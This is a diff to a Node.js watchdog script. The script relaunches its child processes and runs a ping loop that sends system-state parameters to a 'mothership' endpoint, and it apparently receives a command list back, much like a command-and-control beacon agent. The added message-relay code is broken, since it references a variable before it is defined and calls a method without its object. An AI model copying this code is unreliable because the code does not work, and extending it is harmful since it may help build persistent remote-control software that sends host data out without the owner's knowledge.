@@ -1,5 +1,9 @@
 // 20260702-0945
 // https://onecompiler.com/nodejs#draft-yf7t
+
+// TODO
+// TEST
+// anchor
 const { execFile } = require('child_process');
 const net = require('net');
 const { exec, spawn } = require('child_process');
@@ -309,6 +313,17 @@ class CmdConfig {
         return this.#__launchprocname;
     };
 
+    getChildCmd(cmdname) {
+        for ( let i = 0; i< this.#__childcmds.length; i++) {
+            let childcmd = this.#__childcmds[i];
+            if ( childcmd.cmdname == cmdname ) {
+                return childcmd;
+            }
+        }
+
+        return null;
+    };
+
     get childcmds() {
         return this.#__childcmds;
     };
@@ -385,31 +400,42 @@ class CmdConfig {
             return;
         }
 
+        let cmdprocess = getProcess(tcmdpid);
         let procname = cmdprocess ? cmdprocess.Name.toLowerCase() : 'UNKNOWN';
 
         if ( ispidalive ) {
-            let cmdprocess = getProcess(tcmdpid);
 
-            if  ( cmdprocess &&  ( ! procname.includes(this.launchprocname) ) ) { // TODO test this mechanism
+            // TEST
+            if  ( cmdprocess &&  ( ! procname.includes(this.launchprocname) ) ) {
                 this.launch();
                 logmsg('finished');
                 return;    
             }
         }
 
+        // procname = 'node.exe'
         logmsg(`finished -- no need to launch -- [${this.cmdname}] cmd is running with pid=${tcmdpid} process name=${procname}`);
 
         logmsg('finished');
     };
 
-    // used by watchdog to relay messages between child cmds
+    // used by watchdog to relay messages between ping and cmdlist
     processMessage(msg) {
-        // TODO: parent function to process incomming messages from child processes
-        // extract dest, send message to other child
+        let src = msg.src;
+        let dest = msg.dest;
+        let payload = msg.payload;
+
+        let destcmd = this.getChildCmd(destcmd.cmdname);
+
+        if ( ! destcmd ) {
+            throw new Error(`could not find ${destcmd.cmdname} in child cmds list`);
+        }
+
+        sendMessage(destcmd, src, payload);
     };
 
-    sendMessage(childcmd, msgpayload) {
-        let childp = childcmd.childprocess;
+    sendMessage(destcmd, src, msgpayload) {
+        let childp = destcmd.childprocess;
 
         if ( ! childp ) {
             throw new Error('childcmd does not have valid child process');
@@ -421,8 +447,8 @@ class CmdConfig {
         
         let msgout = {
             senderPid:process.pid,
-            src:systemstate.cmdname,
-            dest:childcmd.cmdname,
+            src:src,
+            dest:destcmd.cmdname,
             payload:msgpayload,
             ts:getTimestamp()
         }
@@ -452,8 +478,9 @@ class CmdConfig {
 
         writeTag(this.cmdpidfpath, String(child.pid));
         
+        // incomming message from child process (sender:cmdlist, ping -- receiver: watchdog)
         child.on('message', (message) => {
-            logmsg('incomming message: ' + JSON.stringify(message));
+            logmsg('[YER]incomming message: ' + JSON.stringify(message));
 
             this.processMessage(message);
         });
@@ -845,14 +872,12 @@ async function makeGetRequest(baseUrl, params, inputHeaders, downloadOpts = null
 }
 
 function fileExists(filePath) {
-    
     try {
         const stats = fs.statSync(filePath);
         return stats.isFile();
     } catch (error) {
         return false;
     }
-
 }
 
 function readTag(fpath) {
@@ -935,7 +960,7 @@ process.on('message', (message) => {
         throw new Error('null message');
     }
 
-    logmsg(`incomming message:` + JSON.stringify(message));
+    logmsg(`[XAW]incomming message:` + JSON.stringify(message));
 
     if ( handleMessage ) {
         handleMessage(message);
@@ -1009,7 +1034,7 @@ function watchdog() {
     systemstate.cmdconfig.addchildcmd(pingcmd);
     systemstate.cmdconfig.addchildcmd(cmdlistcmd);
 
-    let childcmds = systemstate.cmdconfig.childcmds; // anchor
+    let childcmds = systemstate.cmdconfig.childcmds;
     
     let cmdconfig = systemstate.cmdconfig;
 
@@ -1154,12 +1179,9 @@ async function ping_loop() {
     let baseUrl = systemstate.mothership + '/ow/ping.php';
 
     let inputHeaders = null;
-    let params = {
-        clientid: '99998888'
-    };
-    downloadOpts = null;
+    let params = systemstate.statekvp;
     
-    let pingresponse = await makeGetRequest(baseUrl, params, inputHeaders, downloadOpts);
+    let pingresponse = await makeGetRequest(baseUrl, params, inputHeaders, null);
     
     let isvalid = validatePingResponse(pingresponse);
 
